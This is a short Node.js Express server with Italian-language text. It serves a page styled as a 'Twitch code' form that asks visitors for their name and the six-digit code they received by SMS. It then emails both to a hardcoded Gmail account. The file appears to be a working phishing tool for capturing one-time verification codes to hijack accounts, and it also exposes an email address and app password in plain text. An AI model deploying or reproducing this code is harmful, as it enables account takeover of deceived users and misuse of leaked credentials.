console.log("Avvio server...");

const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");

const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));

const formHTML = `
<!DOCTYPE html>
<html>
<head>
  <title>Codice Twitch</title>
</head>
<body>
  <h2>Inserisci il codice ricevuto via SMS</h2>
  <form method="POST" action="/submit-code">
    <input type="text" name="name" placeholder="Il tuo nome" required />
    <input type="text" name="code" placeholder="Codice a 6 cifre" pattern="\\d{6}" required />
    <button type="submit">Invia</button>
  </form>
</body>
</html>
`;

app.get("/", (req, res) => {
  res.send(formHTML);
});

app.post("/submit-code", (req, res) => {
  const { name, code } = req.body;

  // Verifica che il codice sia 6 cifre
  if (!/^\d{6}$/.test(code)) {
    return res.send("❌ Codice non valido. Inserisci esattamente 6 cifre.");
  }

  // Configura nodemailer
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "trent6724@gmail.com",
      pass: "wwxd mgse diua wspw" // ricordati di sostituirlo con la tua password app
    }
  });

  const mailOptions = {
    from: "trent6724@gmail.com",
    to: "trent6724@gmail.com",
    subject: `Codice ricevuto da ${name}`,
    text: `Nome: ${name}\nCodice inserito: ${code}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log("Errore invio email:", error);
      return res.send("❌ Errore durante l'invio della mail.");
    }
    res.send("✅ Codice ricevuto con successo. Grazie!");
  });
});

app.listen(PORT, () => {
  console.log(`Server attivo su http://localhost:${PORT}`);
});
